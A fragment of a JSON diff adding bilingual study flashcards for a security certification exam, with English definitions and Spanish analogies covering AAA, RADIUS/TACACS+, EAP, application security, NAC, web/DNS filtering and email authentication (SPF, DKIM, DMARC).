+        "raw_content": "* **Definition:** A security framework that controls access to network resources by verifying user identity (Authentication), determining what the user is allowed to do (Authorization), and tracking user activity (Accounting).\n\nAAA is implemented in wireless and enterprise networks to centralize access control and enforce security policies consistently across all users and devices. Implementing AAA protocols is fundamental in environments transmitting sensitive data with stringent compliance requirements.\n\n> *Como el sistema de un aeropuerto: la seguridad verifica quién eres (Autenticación), el boarding pass define a qué puerta puedes ir (Autorización), y el registro de vuelo documenta todo lo que hiciste (Accounting).*"
+      },
+      {
+        "name": "AAA: RADIUS",
+        "definition": "Remote Authentication Dial-In User Service — a networking protocol that operates on a client-server model and provides centralized Authentication, Authorization, and Accounting (AAA) services for network users.",
+        "analogy": "*Como una recepcionista centralizada de un edificio corporativo: todos los visitantes pasan por ella, ella verifica la identidad y lleva el registro de quién entra y cuándo.*",
+        "raw_content": "* **Definition:** Remote Authentication Dial-In User Service — a networking protocol that operates on a client-server model and provides centralized Authentication, Authorization, and Accounting (AAA) services for network users.\n\nRADIUS is the most widely used AAA protocol in enterprise wireless environments. It authenticates users through a centralized server, validates identities, grants access based on predefined policies, and monitors user activity for accountability.\n\n> *Como una recepcionista centralizada de un edificio corporativo: todos los visitantes pasan por ella, ella verifica la identidad y lleva el registro de quién entra y cuándo.*"
+      },
+      {
+        "name": "AAA: TACACS+",
+        "definition": "Terminal Access Controller Access-Control System Plus — an AAA protocol that separates the Authentication, Authorization, and Accounting functions into distinct services and encrypts the entire authentication process using TCP.",
+        "analogy": "*Como tener tres departamentos separados en el aeropuerto: uno para verificar identidad, otro para emitir permisos, y otro para llevar los registros — cada uno especializado.*",
+        "raw_content": "* **Definition:** Terminal Access Controller Access-Control System Plus — an AAA protocol that separates the Authentication, Authorization, and Accounting functions into distinct services and encrypts the entire authentication process using TCP.\n\nUnlike RADIUS, which combines AAA into a single process, TACACS+ handles each function separately, allowing more granular control. It also encrypts the **entire authentication payload** (not just the password), making it more secure than RADIUS for device administration.\n\n> *Como tener tres departamentos separados en el aeropuerto: uno para verificar identidad, otro para emitir permisos, y otro para llevar los registros — cada uno especializado.*\n\n| Feature            | RADIUS                      | TACACS+                       |\n| ------------------ | --------------------------- | ----------------------------- |\n| **Protocol**       | UDP                         | TCP                           |\n| **Encryption**     | Password only               | Entire authentication payload |\n| **AAA separation** | Combined                    | Separated (more granular)     |\n| **Primary use**    | Network access (Wi-Fi, VPN) | Device administration         |"
+      },
+      {
+        "name": "Wireless Security Settings: EAP — Extensible Authentication Protocol",
+        "definition": "An authentication framework that defines message formats and negotiation procedures for multiple authentication methods used in wireless networks and point-to-point connections; not a specific protocol itself but a framework that supports various EAP methods.",
+        "analogy": "*Como un marco legal que no define las leyes en sí, sino las reglas sobre cómo deben ser escritas y aplicadas.*",
+        "raw_content": "* **Definition:** An authentication framework that defines message formats and negotiation procedures for multiple authentication methods used in wireless networks and point-to-point connections; not a specific protocol itself but a framework that supports various EAP methods.\n\nEAP supports authentication via token cards, smart cards, certificates, one-time passwords, and more. It is used with RADIUS servers in 802.1X-based network access control.\n\n> *Como un marco legal que no define las leyes en sí, sino las reglas sobre cómo deben ser escritas y aplicadas.*"
+      },
+      {
+        "name": "EAP: PEAP (Protected EAP)",
+        "definition": "An EAP method developed by Cisco, Microsoft, and RSA that encapsulates EAP within an encrypted TLS tunnel, requiring a certificate on both server and client side.",
+        "analogy": "*Como enviar un sobre dentro de una caja blindada: el sobre (EAP) viaja protegido por la caja (TLS).*",
+        "raw_content": "* **Definition:** An EAP method developed by Cisco, Microsoft, and RSA that encapsulates EAP within an encrypted TLS tunnel, requiring a certificate on both server and client side.\n\n> *Como enviar un sobre dentro de una caja blindada: el sobre (EAP) viaja protegido por la caja (TLS).*"
+      },
+      {
+        "name": "EAP: EAP-TTLS (EAP Tunneled TLS)",
+        "definition": "An EAP method that creates an encrypted TLS tunnel using only a server-side certificate, then transports a secondary authentication protocol inside the tunnel for client authentication.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An EAP method that creates an encrypted TLS tunnel using only a server-side certificate, then transports a secondary authentication protocol inside the tunnel for client authentication."
+      },
+      {
+        "name": "EAP: EAP-FAST (EAP Flexible Authentication via Secure Tunneling)",
+        "definition": "A Cisco-developed EAP method that uses Protected Access Credentials (PACs) to establish a TLS tunnel for credential verification, designed to allow secure re-authentication when users roam within a network without performing full authentication each time.",
+        "analogy": "*Como tener un pase VIP en un concierto: una vez verificado al entrar, puedes moverte entre áreas sin pasar por seguridad otra vez.*",
+        "raw_content": "* **Definition:** A Cisco-developed EAP method that uses Protected Access Credentials (PACs) to establish a TLS tunnel for credential verification, designed to allow secure re-authentication when users roam within a network without performing full authentication each time.\n\nEAP-FAST was created as a replacement for the vulnerable Lightweight EAP (LEAP) protocol.\n\n> *Como tener un pase VIP en un concierto: una vez verificado al entrar, puedes moverte entre áreas sin pasar por seguridad otra vez.*\n\n---"
+      },
+      {
+        "name": "Application Security",
+        "definition": "The objective domain (4.1) covering the techniques used to build applications that are secure by design, focused on preventing, detecting, and remediating vulnerabilities across the software development lifecycle.",
+        "analogy": "*Como construir un edificio con seguridad integrada desde los planos: no es solo poner una alarma al final, sino diseñar cada pared, puerta y ventana pensando en seguridad desde el inicio.*",
+        "raw_content": "* **Definition:** The objective domain (4.1) covering the techniques used to build applications that are secure by design, focused on preventing, detecting, and remediating vulnerabilities across the software development lifecycle.\n\nThere are six areas covered under this objective: **input validation, secure cookies, static code analysis, dynamic code analysis, code signing, and sandboxing**. Together, these form a layered approach to securing software before, during, and after deployment.\n\n> *Como construir un edificio con seguridad integrada desde los planos: no es solo poner una alarma al final, sino diseñar cada pared, puerta y ventana pensando en seguridad desde el inicio.*"
+      },
+      {
+        "name": "Application Security: Input Validation",
+        "definition": "A security technique that verifies all data inputs to an application meet defined criteria before the application processes them, preventing malicious data from triggering unintended behavior such as SQL injection, XSS, or buffer overflow attacks.",
+        "analogy": "*Como los filtros en la entrada de agua de un edificio: primero hay una rejilla gruesa afuera (front-end) y luego un filtro fino adentro (back-end). Ambos son necesarios porque la rejilla sola no atrapa todo.*",
+        "raw_content": "* **Definition:** A security technique that verifies all data inputs to an application meet defined criteria before the application processes them, preventing malicious data from triggering unintended behavior such as SQL injection, XSS, or buffer overflow attacks.\n\nInput validation acts as a **gatekeeper** — ensuring only well-defined, correctly formatted data reaches the application logic. It must be implemented at both the **front-end** (client-side) and **back-end** (server-side) because front-end validation alone can be bypassed by an attacker intercepting the request.\n\n> *Como los filtros en la entrada de agua de un edificio: primero hay una rejilla gruesa afuera (front-end) y luego un filtro fino adentro (back-end). Ambos son necesarios porque la rejilla sola no atrapa todo.*\n\n- **Front-end validation:** Performed in the browser/UI before data is sent to the server. Fast but bypassable.\n- **Back-end validation:** Performed on the server before data is processed. Authoritative and cannot be bypassed by the user.\n- **Validation rules:** Define what inputs are acceptable (e.g., a phone number field only accepts 10 digits, no letters or special characters).\n\n⚠️ **Exam Tip:** Input validation is not a standalone defense. It must be combined with a **defense-in-depth** strategy including secure communication protocols, error handling, and regular security auditing."
+      },
+      {
+        "name": "Application Security: Secure Cookies",
+        "definition": "Web cookies that are configured with security attributes (Secure, HttpOnly, SameSite) to prevent interception, unauthorized script access, and cross-site request forgery attacks.",
+        "analogy": "*Como una llave de hotel: si la llave no tiene protección de clonación, cualquiera que la toque puede copiarla. Los atributos de seguridad son esa protección.*",
+        "raw_content": "* **Definition:** Web cookies that are configured with security attributes (Secure, HttpOnly, SameSite) to prevent interception, unauthorized script access, and cross-site request forgery attacks.\n\nCookies store session and state information between the web server and client. If improperly configured, they can be exploited for **session hijacking** or **sensitive data theft**.\n\n> *Como una llave de hotel: si la llave no tiene protección de clonación, cualquiera que la toque puede copiarla. Los atributos de seguridad son esa protección.*\n\n| Attribute  | Protection                                                           |\n| ---------- | -------------------------------------------------------------------- |\n| `Secure`   | Cookie only transmitted over HTTPS — prevents interception over HTTP |\n| `HttpOnly` | Cookie not accessible by JavaScript DOM — prevents XSS-based theft   |\n| `SameSite` | Restricts cross-origin cookie access — reduces CSRF attack risk      |\n\n⚠️ **Exam Tip:** Always **generate a new session cookie on each authentication** rather than using persistent cookies, to prevent session hijacking."
+      },
+      {
+        "name": "Application Security: Static Code Analysis (SAST)",
+        "definition": "A security testing method that reviews and analyzes application source code before execution to identify potential vulnerabilities such as buffer overflows, SQL injection risks, XSS vectors, and missing input validation.",
+        "analogy": "*Como revisar un contrato legal antes de firmarlo: buscas errores y cláusulas problemáticas antes de que el contrato entre en vigor.*",
+        "raw_content": "* **Definition:** A security testing method that reviews and analyzes application source code before execution to identify potential vulnerabilities such as buffer overflows, SQL injection risks, XSS vectors, and missing input validation.\n\nAlso called **Static Application Security Testing (SAST)**. The analysis is performed by automated tools (software analyzers that must support the language used) or human reviewers (**manual code review**). When performed by a human, a **different programmer** should review the code than the one who wrote it, to minimize blind spots from assumptions or experience gaps.\n\n> *Como revisar un contrato legal antes de firmarlo: buscas errores y cláusulas problemáticas antes de que el contrato entre en vigor.*"
+      },
+      {
+        "name": "Application Security: Dynamic Code Analysis (DAST)",
+        "definition": "A security testing method that analyzes an application while it is actively running to find vulnerabilities that static analysis cannot detect, such as runtime errors, memory leaks, and input-driven vulnerabilities.",
+        "analogy": "*Como probar un puente con cargas reales de tráfico: no basta con revisar los planos, hay que ver cómo se comporta bajo condiciones reales.*",
+        "raw_content": "* **Definition:** A security testing method that analyzes an application while it is actively running to find vulnerabilities that static analysis cannot detect, such as runtime errors, memory leaks, and input-driven vulnerabilities.\n\nAlso called **Dynamic Application Security Testing (DAST)**. The two primary methods of DAST are fuzzing and stress testing, detailed below.\n\n> *Como probar un puente con cargas reales de tráfico: no basta con revisar los planos, hay que ver cómo se comporta bajo condiciones reales.*"
+      },
+      {
+        "name": "Dynamic Code Analysis: Fuzzing (Fuzz Testing)",
+        "definition": "A dynamic software testing technique that injects large volumes of random, malformed, or unexpected data (fuzz) into a system to discover crashes, code assertion failures, memory leaks, and security loopholes.",
+        "analogy": "*Como meter basura aleatoria en una trituradora para ver si se rompe: si se atasca, hay un fallo de diseño.*",
+        "raw_content": "* **Definition:** A dynamic software testing technique that injects large volumes of random, malformed, or unexpected data (fuzz) into a system to discover crashes, code assertion failures, memory leaks, and security loopholes.\n\nFuzzing is automated and can uncover vulnerabilities that human testers or static tools would miss. The system is monitored for crashes or unexpected behavior in response to the fuzz input.\n\n> *Como meter basura aleatoria en una trituradora para ver si se rompe: si se atasca, hay un fallo de diseño.*"
+      },
+      {
+        "name": "Dynamic Code Analysis: Stress Testing",
+        "definition": "A type of dynamic software testing that evaluates system stability and reliability under extreme conditions and high loads to identify weak points and failure behaviors.",
+        "analogy": "*Como llenar un estadio más allá de su capacidad diseñada para ver cuándo y cómo ceden las estructuras.*",
+        "raw_content": "* **Definition:** A type of dynamic software testing that evaluates system stability and reliability under extreme conditions and high loads to identify weak points and failure behaviors.\n\nStress testing simulates scenarios like thousands of concurrent users accessing a web application simultaneously to identify performance bottlenecks, test load balancing effectiveness, and ensure the system can recover from failure.\n\n> *Como llenar un estadio más allá de su capacidad diseñada para ver cuándo y cómo ceden las estructuras.*"
+      },
+      {
+        "name": "Application Security: Code Signing",
+        "definition": "A security technique that uses a digital signature — created by hashing a file and encrypting the hash with the developer's private key — to verify the software author's identity and confirm that the code has not been altered since it was signed.",
+        "analogy": "*Como un sello notarial en un documento: no garantiza que el contenido sea bueno, pero sí confirma quién lo firmó y que no fue alterado después de la firma.*",
+        "raw_content": "* **Definition:** A security technique that uses a digital signature — created by hashing a file and encrypting the hash with the developer's private key — to verify the software author's identity and confirm that the code has not been altered since it was signed.\n\nThe code signing process:\n\n1. Developer computes a **cryptographic hash** of the software file.\n2. Hash is encrypted with the developer's **private key** to create the digital signature.\n3. The software is distributed with a **code signing certificate** containing the developer's public key.\n4. The recipient's OS uses the CA (Certification Authority) public key to **verify the signature** and confirm the code is unmodified, then asks the user whether to trust and run it.\n\n> *Como un sello notarial en un documento: no garantiza que el contenido sea bueno, pero sí confirma quién lo firmó y que no fue alterado después de la firma.*\n\n⚠️ **Exam Tip:** Code signing confirms **integrity and authenticity** — it does NOT guarantee the software is free of vulnerabilities. It only confirms the code has not been tampered with since the developer signed it."
+      },
+      {
+        "name": "Application Security: Sandboxing",
+        "definition": "A security mechanism that isolates running programs in a restricted environment, limiting the system resources and changes they can access, to safely execute untested or untrusted code without risking harm to the host system or network.",
+        "analogy": "*Como un terrario de vidrio para estudiar insectos peligrosos: los puedes observar y analizar sin riesgo de que escapen al resto del laboratorio.*",
+        "raw_content": "* **Definition:** A security mechanism that isolates running programs in a restricted environment, limiting the system resources and changes they can access, to safely execute untested or untrusted code without risking harm to the host system or network.\n\nSandboxes are used in browsers, email clients, and security research environments. They allow testing of potentially malicious code in a contained environment — including running multiple sandboxes with different operating systems on the same physical machine.\n\n> *Como un terrario de vidrio para estudiar insectos peligrosos: los puedes observar y analizar sin riesgo de que escapen al resto del laboratorio.*\n\nSandboxes provide more comprehensive protection than traditional antivirus tools because they can test code against **multiple OS configurations** simultaneously.\n\n---"
+      },
+      {
+        "name": "Network Access Control (NAC)",
+        "definition": "The objective domain (4.5) covering the security solution that scans and evaluates the security posture of devices attempting to connect to a network before granting access, enforcing compliance with security policies and quarantining non-compliant devices for remediation.",
+        "analogy": "*Como el control de sanidad en un aeropuerto internacional: si no cumples los requisitos de salud, no entras al país — esperas en cuarentena hasta que te pongas al día.*",
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the security solution that scans and evaluates the security posture of devices attempting to connect to a network before granting access, enforcing compliance with security policies and quarantining non-compliant devices for remediation.\n\nNAC applies to both **on-premises wired/wireless devices** and **remote VPN connections**. The device is placed in a virtual holding area during inspection. NAC enforces a **zero trust architecture** as part of a defense-in-depth strategy.\n\n> *Como el control de sanidad en un aeropuerto internacional: si no cumples los requisitos de salud, no entras al país — esperas en cuarentena hasta que te pongas al día.*\n\n**NAC inspection checks can include:**\n\n- Basic authentication (e.g., EAP)\n- Antivirus definition currency\n- Operating system patch status\n- Security configuration compliance\n\n**Outcomes:**\n\n- **Pass:** Device receives full network access.\n- **Fail:** Device is placed in a **quarantine screened subnet** where it can receive updates and patches but cannot communicate with the rest of the network until it passes reinspection."
+      },
+      {
+        "name": "NAC: Persistent vs. Non-Persistent Agents",
+        "definition": "Persistent agents are software installed permanently on managed devices for continuous NAC enforcement; non-persistent agents are downloaded temporarily at connection time, perform a compliance scan, and then delete themselves — commonly used in BYOD environments.",
+        "analogy": "*El persistente es como un guardia de seguridad asignado permanentemente a tu escritorio. El no-persistente es como el guardia de seguridad temporal de un evento: llega, revisa tu credencial y se va.*",
+        "raw_content": "* **Definition:** Persistent agents are software installed permanently on managed devices for continuous NAC enforcement; non-persistent agents are downloaded temporarily at connection time, perform a compliance scan, and then delete themselves — commonly used in BYOD environments.\n\n| Agent Type         | Use Case                            | Behavior                                                |\n| ------------------ | ----------------------------------- | ------------------------------------------------------- |\n| **Persistent**     | Corporate-owned, managed devices    | Installed software, continuous monitoring               |\n| **Non-Persistent** | BYOD, college campuses, guest Wi-Fi | Downloaded via captive portal, scans once, self-deletes |\n\n> *El persistente es como un guardia de seguridad asignado permanentemente a tu escritorio. El no-persistente es como el guardia de seguridad temporal de un evento: llega, revisa tu credencial y se va.*"
+      },
+      {
+        "name": "NAC: IEEE 802.1X",
+        "definition": "An IEEE standard for port-based network access control that provides authenticated access to wireless and wired networks, forming the foundation upon which most modern NAC solutions are built.",
+        "analogy": "",
+        "raw_content": "* **Definition:** An IEEE standard for port-based network access control that provides authenticated access to wireless and wired networks, forming the foundation upon which most modern NAC solutions are built.\n\nNAC can be implemented as a hardware or software solution, and most modern NAC platforms build additional features on top of the 802.1X foundation."
+      },
+      {
+        "name": "NAC: Access Control Factors",
+        "definition": "Rule-based criteria beyond health policy compliance that NAC systems use to grant or deny network access, including time, location, role, and logical rule sets.",
+        "analogy": "*Como un edificio corporativo con diferentes niveles de acceso por tarjeta: el guardia no solo verifica tu identidad, sino también tu rol, la hora y desde dónde vienes.*",
+        "raw_content": "* **Definition:** Rule-based criteria beyond health policy compliance that NAC systems use to grant or deny network access, including time, location, role, and logical rule sets.\n\n| Factor                        | Description                                                         | Example                                                                                |\n| ----------------------------- | ------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |\n| **Time-based**                | Restricts access to defined hours                                   | Block logins at 2 AM for 9–5 business                                                  |\n| **Location-based**            | Evaluates geolocation of connection (IP, GPS)                       | Flag login from Italy when user always logs in from Florida                            |\n| **Role-based (Adaptive NAC)** | Re-evaluates authorization based on what the device is trying to do | Block user laptop from accessing server management subnet, but allow a server to do so |\n| **Rule-based**                | Logical if/then policy chains                                       | If user = instructor → allow; if user = student → deny                                 |\n\n> *Como un edificio corporativo con diferentes niveles de acceso por tarjeta: el guardia no solo verifica tu identidad, sino también tu rol, la hora y desde dónde vienes.*\n\n---"
+      },
+      {
+        "name": "Web and DNS Filtering",
+        "definition": "The objective domain (4.5) covering the techniques used to restrict or control the internet content users can access, in order to prevent productivity loss and protect against malicious websites.",
+        "analogy": "*Como tener dos líneas de defensa para proteger una casa: una reja en la entrada de la calle (DNS filtering) y guardias revisando a cada visitante que sí logra entrar (web filtering).*",
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the techniques used to restrict or control the internet content users can access, in order to prevent productivity loss and protect against malicious websites.\n\nThis objective covers two distinct filtering approaches: **web filtering** (content-level filtering with six sub-methods) and **DNS filtering** (domain-resolution-level blocking).\n\n> *Como tener dos líneas de defensa para proteger una casa: una reja en la entrada de la calle (DNS filtering) y guardias revisando a cada visitante que sí logra entrar (web filtering).*"
+      },
+      {
+        "name": "Web and DNS Filtering: Web Filtering (Content Filtering)",
+        "definition": "A technique used to restrict or control the content a user can access on the internet, implemented through agents, proxies, URL scanning, content categorization, block rules, or reputation scoring.",
+        "analogy": "*Como un filtro de correo que no solo bloquea spam, sino que también organiza lo que entra según reglas definidas por la organización.*",
+        "raw_content": "* **Definition:** A technique used to restrict or control the content a user can access on the internet, implemented through agents, proxies, URL scanning, content categorization, block rules, or reputation scoring.\n\n> *Como un filtro de correo que no solo bloquea spam, sino que también organiza lo que entra según reglas definidas por la organización.*"
+      },
+      {
+        "name": "Web Filtering: Agent-Based Web Filtering",
+        "definition": "A web filtering method that installs a software agent on each device to enforce internet usage policies regardless of the network the device is connected to — ideal for remote and mobile workers.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A web filtering method that installs a software agent on each device to enforce internet usage policies regardless of the network the device is connected to — ideal for remote and mobile workers.\n\nSince the policy is applied **at the device level**, it works on corporate networks, public Wi-Fi, and home networks alike."
+      },
+      {
+        "name": "Web Filtering: Centralized Proxy",
+        "definition": "A server that acts as an intermediary between users and the internet, evaluating all web requests against organizational policies before forwarding or blocking them.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A server that acts as an intermediary between users and the internet, evaluating all web requests against organizational policies before forwarding or blocking them.\n\nWhen a user requests a website, the proxy evaluates it against policy. If compliant, the proxy retrieves the content on behalf of the user. If non-compliant, the request is blocked and an error message is returned."
+      },
+      {
+        "name": "Web Filtering: URL Scanning",
+        "definition": "A technique that checks requested URLs against a database of known malicious websites before allowing or denying access.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A technique that checks requested URLs against a database of known malicious websites before allowing or denying access.\n\nIf the URL is on the known-malicious list, access is blocked. If not found in the database, it is assumed safe and access is permitted."
+      },
+      {
+        "name": "Web Filtering: Content Categorization",
+        "definition": "A method of classifying websites into categories (social media, adult content, gambling, etc.) so organizations can block or allow entire categories based on their usage policies.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A method of classifying websites into categories (social media, adult content, gambling, etc.) so organizations can block or allow entire categories based on their usage policies."
+      },
+      {
+        "name": "Web Filtering: Block Rules",
+        "definition": "Specific administrator-defined rules that prevent access to certain websites or IP addresses, often used reactively when a specific threat is identified (e.g., blocking an IP address used for data exfiltration).",
+        "analogy": "",
+        "raw_content": "* **Definition:** Specific administrator-defined rules that prevent access to certain websites or IP addresses, often used reactively when a specific threat is identified (e.g., blocking an IP address used for data exfiltration)."
+      },
+      {
+        "name": "Web Filtering: Reputation-Based Filtering",
+        "definition": "A web filtering method that blocks or allows websites based on a reputation score assigned by a third-party service, factoring in the site's history of hosting malware, phishing, or other malicious activity.",
+        "analogy": "",
+        "raw_content": "* **Definition:** A web filtering method that blocks or allows websites based on a reputation score assigned by a third-party service, factoring in the site's history of hosting malware, phishing, or other malicious activity."
+      },
+      {
+        "name": "Web and DNS Filtering: DNS Filtering",
+        "definition": "A security technique that blocks access to specific websites by preventing the DNS server from resolving blacklisted domain names into IP addresses, effectively stopping connections before they are established.",
+        "analogy": "*Como arrancar las páginas de un directorio telefónico: si el número no aparece, no puedes llamar, aunque sepas que la empresa existe.*",
+        "raw_content": "* **Definition:** A security technique that blocks access to specific websites by preventing the DNS server from resolving blacklisted domain names into IP addresses, effectively stopping connections before they are established.\n\nWhen a user requests a website, their device sends a DNS query. If the domain is on the **block list**, the DNS server refuses to return the IP address and the connection never occurs. If not on the block list, the IP address is returned and the user is redirected to the site.\n\n> *Como arrancar las páginas de un directorio telefónico: si el número no aparece, no puedes llamar, aunque sepas que la empresa existe.*\n\nDNS filtering is commonly used in schools, universities, and enterprise environments to enforce internet usage policies and prevent access to malicious or prohibited content.\n\n---"
+      },
+      {
+        "name": "Email Security",
+        "definition": "The objective domain (4.5) covering the protocols and mechanisms used to safeguard email content, accounts, and infrastructure from unauthorized access, loss, or compromise.",
+        "analogy": "*Como un sistema de aduana para el correo: verifica la identidad del remitente, revisa que el paquete no haya sido alterado, y decide qué hacer si algo no cuadra.*",
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the protocols and mechanisms used to safeguard email content, accounts, and infrastructure from unauthorized access, loss, or compromise.\n\nThis objective covers three email authentication protocols (**DKIM, SPF, DMARC**), the **email gateway** infrastructure, and **spam filtering** mechanisms.\n\n> *Como un sistema de aduana para el correo: verifica la identidad del remitente, revisa que el paquete no haya sido alterado, y decide qué hacer si algo no cuadra.*"
+      },
+      {
+        "name": "Email Security: DKIM — DomainKeys Identified Mail",
+        "definition": "An email authentication method that adds a cryptographic digital signature to outgoing email headers, allowing receiving servers to verify that the email was sent from the claimed domain and that the content was not modified in transit.",
+        "analogy": "*Como un sello de cera en una carta medieval: confirma quién la envió y que nadie la abrió en el camino.*",
+        "raw_content": "* **Definition:** An email authentication method that adds a cryptographic digital signature to outgoing email headers, allowing receiving servers to verify that the email was sent from the claimed domain and that the content was not modified in transit.\n\nDKIM works by comparing the signature in the email header against the sender's **public key published in the domain's DNS records**. If the signature validates, the email is confirmed to be authentic and unmodified.\n\n> *Como un sello de cera en una carta medieval: confirma quién la envió y que nadie la abrió en el camino.*\n\n**Benefits:** Email authentication · Protection against email spoofing · Improved deliverability · Enhanced domain reputation"
+      },
+      {
+        "name": "Email Security: SPF — Sender Policy Framework",
+        "definition": "An email authentication method that allows receiving mail servers to verify that an incoming email's sender IP address is authorized to send email on behalf of the claimed domain, as defined in that domain's DNS records.",
+        "analogy": "*Como una lista de empleados autorizados para hacer pedidos a nombre de una empresa: si el que llama no está en la lista, el proveedor rechaza el pedido.*",
+        "raw_content": "* **Definition:** An email authentication method that allows receiving mail servers to verify that an incoming email's sender IP address is authorized to send email on behalf of the claimed domain, as defined in that domain's DNS records.\n\nWhen email arrives, the receiving server queries the sender's domain DNS records for the SPF record. If the sending IP is not listed as authorized, the email is flagged as spam or rejected.\n\n> *Como una lista de empleados autorizados para hacer pedidos a nombre de una empresa: si el que llama no está en la lista, el proveedor rechaza el pedido.*\n\n**Benefits:** Prevents email spoofing · Improved email deliverability · Enhanced domain reputation"
+      },
+      {
+        "name": "Email Security: DMARC — Domain-Based Message Authentication, Reporting, and Conformance",
+        "definition": "An email validation system that builds on DKIM and SPF by verifying domain alignment between the authenticated domain and the visible \"From\" address, enforcing what receiving servers should do with emails that fail this check, and providing reporting back to the domain owner.",
+        "analogy": "*Como el jefe de seguridad que no solo revisa los controles, sino que también verifica que la identificación coincida con la cara de la persona (alignment), define qué hacer cuando algo falla (advertencia, cuarentena o expulsión), y además le manda un reporte diario a la central de cuántos intentos sospechosos hubo.*",
+        "raw_content": "* **Definition:** An email validation system that builds on DKIM and SPF by verifying domain alignment between the authenticated domain and the visible \"From\" address, enforcing what receiving servers should do with emails that fail this check, and providing reporting back to the domain owner.\n\nDMARC requires that at least one of DKIM or SPF passes AND is **aligned** — meaning the domain validated by DKIM or SPF must match the domain shown in the visible \"From\" header. This alignment check is what DMARC adds on top of DKIM/SPF individually: an attacker can pass SPF or DKIM using their own legitimately-configured domain while still spoofing the \"From\" address seen by the user. Without DMARC, SPF and DKIM alone don't prevent this.\n\nThe domain owner publishes a DMARC policy in DNS that tells receiving servers what to do when alignment or authentication fails (`none`, `quarantine`, `reject`), removing the inconsistency of each receiving server deciding independently how to handle failures.\n\n> *Como el jefe de seguridad que no solo revisa los controles, sino que también verifica que la identificación coincida con la cara de la persona (alignment), define qué hacer cuando algo falla (advertencia, cuarentena o expulsión), y además le manda un reporte diario a la central de cuántos intentos sospechosos hubo.*"
+      },
+      {
+        "name": "Email Security: DMARC — Reporting (rua/ruf)",
+        "definition": "The mechanism by which DMARC sends aggregate (rua) and forensic (ruf) failure reports back to the domain owner, providing visibility into spoofing attempts that DKIM and SPF alone do not offer.",
+        "analogy": "",
+        "raw_content": "* **Definition:** The mechanism by which DMARC sends aggregate (rua) and forensic (ruf) failure reports back to the domain owner, providing visibility into spoofing attempts that DKIM and SPF alone do not offer.\n\nNeither DKIM nor SPF report back to the domain owner. DMARC's reporting function is what allows a domain owner to detect that their domain is actively being used for phishing or spoofing campaigns — something otherwise invisible without DMARC in place.\n\nDMARC is the primary defense against **business email compromise (BEC)**, phishing emails, and email scams at the domain level.\n\n⚠️ **Exam Tip:** Every enterprise email server should implement DMARC as a **minimum baseline** of email protection. DMARC requires only one of DKIM or SPF to pass (with alignment) — not both — but without DMARC, a passing SPF or DKIM check does not guarantee the visible \"From\" address is legitimate."
+      },
+      {
+        "name": "Email Security: DNS Record Locations for SPF, DKIM, and DMARC",
+        "definition": "The specific DNS TXT record locations where SPF, DKIM, and DMARC are published and validated, none of which require configuration within SMTP itself.",
+        "analogy": "*El SMTP es el camión que transporta el paquete; el DNS es la oficina notarial donde están registrados los documentos que prueban que el remitente es quien dice ser. El camión no verifica nada — el receptor consulta la notaría (DNS) para confirmar.*",
+        "raw_content": "* **Definition:** The specific DNS TXT record locations where SPF, DKIM, and DMARC are published and validated, none of which require configuration within SMTP itself.\n\nSMTP has no built-in authentication mechanism — that's precisely why SPF, DKIM, and DMARC exist as separate, DNS-based add-ons rather than features of SMTP itself.\n\n| Method | Published At | Contains |\n|---|---|---|\n| **SPF** | TXT record at the domain root | List of IPs/servers authorized to send as that domain |\n| **DKIM** | TXT record under a selector (e.g., `selector1._domainkey.empresa.com`) | The **public key** used to verify the signature |\n| **DMARC** | TXT record at `_dmarc.empresa.com` | The policy (`none`/`quarantine`/`reject`) and reporting destination |\n\nThe one exception that touches the mail server (not DNS): DKIM's **private key** lives on the outbound mail server (the MTA — e.g., Postfix, Exchange, SendGrid), which uses it to cryptographically sign each outgoing email. The corresponding **public key** is what gets published in DNS for the receiving server to verify that signature against.\n\nSPF and DMARC require no mail-server-side configuration at all — they are purely DNS records that the **receiving** server queries to validate.\n\n> *El SMTP es el camión que transporta el paquete; el DNS es la oficina notarial donde están registrados los documentos que prueban que el remitente es quien dice ser. El camión no verifica nada — el receptor consulta la notaría (DNS) para confirmar.*\n\n**Validation flow:**\n---"
+      },
+      {
+        "name": "Email Security: Email Gateway",
+        "definition": "A server or system that serves as the entry and exit point for all organizational email, responsible for routing, filtering, encryption/decryption, and policy enforcement of incoming and outgoing email traffic using SMTP.",
+        "analogy": "*Como la aduana de un aeropuerto: todo lo que entra y sale pasa por ahí, se inspecciona, y se permite o bloquea según las políticas vigentes.*",
+        "raw_content": "* **Definition:** A server or system that serves as the entry and exit point for all organizational email, responsible for routing, filtering, encryption/decryption, and policy enforcement of incoming and outgoing email traffic using SMTP.\n\nEmail gateways use **SMTP (Simple Mail Transfer Protocol)** to send and receive email. All email passes through the gateway before delivery.\n\n> *Como la aduana de un aeropuerto: todo lo que entra y sale pasa por ahí, se inspecciona, y se permite o bloquea según las políticas vigentes.*\n\n**Email gateway functions:**\n\n- **Email routing:** Directs outgoing email to correct destinations; routes incoming email to the right inboxes.\n- **Email security:** Scans for spam, phishing, and malware.\n- **Policy enforcement:** Blocks outgoing emails containing sensitive data; blocks incoming emails from known-malicious senders.\n- **Encryption/Decryption:** Encrypts outgoing and decrypts incoming emails to protect sensitive content in transit.\n\n| Deployment Type | Description                                                                                            |\n| --------------- | ------------------------------------------------------------------------------------------------------ |\n| **On-Premise**  | Physical server in the organization's own data center; maximum control but requires admin overhead     |\n| **Cloud-Based** | Hosted by a third-party; highly scalable and low maintenance but higher cost and limited customization |\n| **Hybrid**      | Combines both; balances control and convenience                                                        |"
+      },
+      {
+        "name": "Email Security: Spam Filtering",
+        "definition": "A process that detects and blocks unsolicited, unwanted emails from reaching user inboxes using techniques such as content analysis, Bayesian filtering, DNS-based blocklists, and predefined email filtering rules.",
+        "analogy": "*Como un portero de club que tiene una lista negra de palabras: si tu mensaje de entrada incluye frases prohibidas, no pasas.*",
